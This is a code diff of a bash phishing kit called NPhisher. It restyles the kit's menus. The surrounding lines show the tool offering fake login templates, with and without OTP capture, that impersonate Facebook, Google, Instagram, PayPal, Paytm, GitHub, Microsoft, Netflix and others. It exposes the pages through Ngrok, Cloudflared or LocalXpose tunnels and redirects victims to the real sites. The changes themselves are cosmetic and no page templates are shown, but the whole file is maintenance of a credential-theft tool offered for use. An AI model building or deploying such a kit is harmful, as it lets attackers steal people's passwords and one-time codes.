@@ -169,7 +169,7 @@ sbanner(){
 
 ## Update Prompt
 uprompt(){
-        prompt="$(echo -e ">> ${YELLOW}${selected} : ${BLUE}")"
+        prompt="$(echo -e ">> ${ULYELLOW}${selected} : ${BLUE}")"
 }
 
 ## Directories
@@ -1165,21 +1165,27 @@ tunnelmenu() {
 clear
 banner
 echo -e " "
+echo -e "${ULWHITE}${BOLDWHITE}CHOOSE A TUNNEL TYPE${NF} : ${NC}"
+echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
 echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
 echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
-
-        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
-
-        case $REPLY in
+echo -e "${NC}"
+selected="NPhisher/${siname}/${sitype}"
+urprompt;read -p "${prompt}" tuchoice
+        case $tuchoice in
                 1 | 01)
+                        tunneler="LocalHost"
                         start_localhost;;
                 2 | 02)
+                        tunneler="Ngrok"
                         check_ngrok;;
                 3 | 03)
+                        tunneler="Cloudflared"
                         check_cloudflared;;
 		4 | 04)
+                        tunneler="LocalXpose"
                         check_localxpose;;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1390,13 +1396,14 @@ site_adobe(){
 siname="Adobe"
 rdurl="www.adobe.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
 	1 | 01)
@@ -1425,13 +1432,14 @@ site_airtelxstream(){
 siname="AirtelXStream"
 rdurl="www.airtelxstream.in"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1452,13 +1460,14 @@ site_ajio(){
 siname="AJIO"
 rdurl="www.ajio.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1479,13 +1488,14 @@ site_amazon(){
 siname="Amazon"
 rdurl="www.amazon.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1506,13 +1516,14 @@ site_apple(){
 siname="Apple"
 rdurl="www.apple.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1533,13 +1544,14 @@ site_badoo(){
 siname="Badoo"
 rdurl="badoo.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1568,15 +1580,16 @@ site_date(){
 siname="Date (Multiple phish)"
 rdurl="date.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1605,13 +1618,14 @@ site_devianart(){
 siname="Devian Art"
 rdurl="www.deviantart.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1639,13 +1653,14 @@ site_ebay(){
 siname="Ebay"
 rdurl="www.ebay.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1666,8 +1681,8 @@ site_facebook(){
 siname="Facebook"
 rdurl="www.facebook.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
@@ -1677,7 +1692,8 @@ echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
 echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1718,13 +1734,14 @@ site_flipcart(){
 siname="Flipcart"
 rdurl="www.flipcart.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1752,15 +1769,16 @@ site_github(){
 siname="GitHub"
 rdurl="www.github.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1789,15 +1807,16 @@ site_gitlab(){
 siname="GitLab"
 rdurl="www.gitlab.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
 	1 | 01)
@@ -1826,13 +1845,14 @@ site_gmail(){
 siname="Gmail"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1853,8 +1873,8 @@ site_google(){
 siname="Google"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
@@ -1863,7 +1883,8 @@ echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
 echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1900,13 +1921,14 @@ site_gpay(){
 siname="Gpay"
 rdurl="pay.google.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1934,8 +1956,8 @@ site_instagram(){
 siname="Instagram"
 rdurl="www.instagram.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
@@ -1950,7 +1972,8 @@ echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
 echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2019,13 +2042,14 @@ site_jio(){
 siname="JIO"
 rdurl="www.jio.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2046,13 +2070,14 @@ site_linkedin(){
 siname="Linkedin"
 rdurl="linkedin.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2073,13 +2098,14 @@ site_mediafire(){
 siname="Medifire"
 rdurl="www.mediafire.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2100,15 +2126,16 @@ site_messenger(){
 siname="Messenger"
 rdurl="www.messenger.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2137,13 +2164,14 @@ site_microsoft(){
 siname="Microsoft"
 rdurl="www.microsoft.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2172,13 +2200,14 @@ site_myspace(){
 siname="MySpace"
 rdurl="myspace.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2199,13 +2228,14 @@ site_netflix(){
 siname="Netflix"
 rdurl="www.netflix.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2242,13 +2272,14 @@ site_paypal(){
 siname="Paypal"
 rdurl="www.paypal.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2269,15 +2300,16 @@ site_paytm(){
 siname="Paytm"
 rdurl="paytm.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2322,14 +2354,15 @@ site_playstation(){
 siname="PlayStation"
 rdurl="www.playstation.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2356,7 +2389,8 @@ rdurl="proton.me/"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2393,13 +2427,14 @@ site_reddit(){
 siname="Reddit"
 rdurl="www.reddit.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
